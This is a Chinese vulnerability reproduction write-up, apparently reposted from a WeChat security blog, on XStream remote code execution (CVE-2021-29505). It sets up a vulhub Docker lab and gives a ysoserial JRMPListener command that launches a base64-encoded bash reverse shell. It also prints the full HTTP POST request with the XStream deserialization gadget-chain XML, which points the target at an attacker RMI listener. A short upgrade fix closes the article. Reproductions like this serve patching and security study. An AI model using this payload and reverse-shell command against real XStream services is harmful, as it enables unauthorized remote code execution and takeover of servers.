原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SfJ7PoshsbPV27zdwVC39Q)



XStream 远程代码执行（CVE-2021-29505 ）

一、简介描述

XStream 是一种 OXMapping 技术，是用来处理 XML 文件序列化的框架, 在将 javaBean 序列化，或将 XML 文件反序列化的时候，不需要其它辅助类和映射文件，使得 XML 序列化不再繁琐。攻击者可以操纵已处理的输入流并替换或注入对象，从而执行从远程服务器加载的任意代码。

二、影响版本：

XStream <= 1.4.16

三、环境搭建：

```
https://raw.githubusercontent.com/vulhub/vulhub/master/xstream/CVE-2021-29505/docker-compose.yml
```

文件：docker-compose.yml

```
version: '2'
services:
 web:
   image: vulhub/xstream:1.4.16
   ports:
    - "8080:8080"
```

docker-compose up -d

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYty5YibrEcuyUgM5YjG1JerIAhscgAIRuKEGwmFAtYjibjzd6tialjicuMQ/640?wx_fmt=png)

镜像已经启动：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYH7ERRte96OVejfbtYAvxUEyPJdXIEuNjmcw9dbicWn9EWJe5I8vha2w/640?wx_fmt=png)

访问地址：http://192.168.0.106:8080/

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYCAsVJ3LiajrwjurTm2BvxrvMU40arsSzUBbPenAricVX5JWvX0AAFd8w/640?wx_fmt=png)

四、漏洞复现

启动服务：

反弹目标需要 base64 加密：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 "bash -c {echo,L2Jpbi9iYxxxxxxxxPiYx}|{base64,-d}|{bash,-i}"
```

执行过程截图：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYGZuKWbpdfuNExMl7iaAiaolfWX7JvLiaNyH94NX6Wmoq4gJAfwZMsib8jQ/640?wx_fmt=png)

执行 poc：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYHosVr15feQa9ERZpQKCF5MqSpZrzrNjWOpdeZp0WoYPKS6gez6Fpdg/640?wx_fmt=png)

获取反弹 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf0xoIHQWA2BlTG2EJlg5yYnc3se995NF14wrUNWO3mOUYAHGiaFriaiblSavEviaUWJOhTc2OLMxD5tA/640?wx_fmt=png)

详细数据包：  

```
POST / HTTP/1.1
Host: 192.168.0.106:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 3115

<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>192.168.0.102</string>
                                                <int>1098</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>192.168.0.102</host>
                                        <port>1098</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

五、漏洞修复：

将 xstream 升级到 1.4.17 或以上版本。（在 maven 的 / pom.xml 中替换高版本 xstream）

```
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.17</version>
</dependency>
```

参考：

https://mp.weixin.qq.com/s/dh7Ewg7Pp-pg3mkLuUv9Rg

https://blog.csdn.net/weixin_45728976/article/details/116942969

